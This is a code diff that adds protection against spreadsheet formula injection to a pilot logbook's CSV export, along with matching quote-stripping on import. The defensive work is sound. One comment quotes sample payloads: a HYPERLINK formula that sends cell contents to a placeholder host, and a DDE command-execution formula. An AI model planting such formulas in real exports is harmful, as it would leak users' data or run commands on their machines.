@@ -30,8 +30,32 @@ export const CSV_HEADERS = [
   "IFR Simulated", "Landings", "Approaches", "Logged Role", "Notes",
 ];
 
+// Spreadsheet formula injection (CWE-1236). Excel / LibreOffice / Sheets treat
+// a cell starting with = + - @ TAB or CR as a FORMULA, so a logbook exported
+// with notes like `=HYPERLINK("http://x/?"&A1,"open")` — or the legacy
+// `=cmd|'/c calc'!A0` DDE form — runs when the pilot opens the file. Free-text
+// fields (notes, crew names, registration) reach an export straight from an
+// imported CSV or a cloud AI scan, i.e. from outside the pilot's own typing,
+// so they must be neutralised on the way out.
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+// Plain numbers legitimately start with - or + and MUST stay numeric in the
+// spreadsheet, so they're exempt (a bare number can't be a formula).
+const PLAIN_NUMBER = /^[-+]?(?:\d+\.?\d*|\.\d+)(?:[eE][-+]?\d+)?$/;
+
+// Prefix the guard quote that tells a spreadsheet "this is text, not a
+// formula". parseCSV strips it again so our own exports round-trip losslessly.
+export function guardCell(s: string): string {
+  return FORMULA_LEAD.test(s) && !PLAIN_NUMBER.test(s) ? "'" + s : s;
+}
+
+// Undo guardCell. Only a quote that actually shields a formula lead is
+// removed, so a genuine value like "'tis" survives untouched.
+export function unguardCell(s: string): string {
+  return s.length > 1 && s[0] === "'" && FORMULA_LEAD.test(s.slice(1)) ? s.slice(1) : s;
+}
+
 function csvCell(v: unknown): string {
-  const s = v == null ? "" : String(v);
+  const s = guardCell(v == null ? "" : String(v));
   return /[",\r\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
 }
 
@@ -63,7 +87,10 @@ export function parseCSV(text: string): string[][] {
     field += c; i++;
   }
   if (field !== "" || row.length) { row.push(field); rows.push(row); }
-  return rows.filter((r) => r.some((c) => c.trim() !== ""));
+  // Strip the anti-formula guard quote (see guardCell) so re-importing our own
+  // export is lossless. Every import path — importCSV and the wizard — funnels
+  // through here, so this is the one place it has to happen.
+  return rows.filter((r) => r.some((c) => c.trim() !== "")).map((r) => r.map(unguardCell));
 }
 
 const MONTH_ABBR: Record<string, number> = {
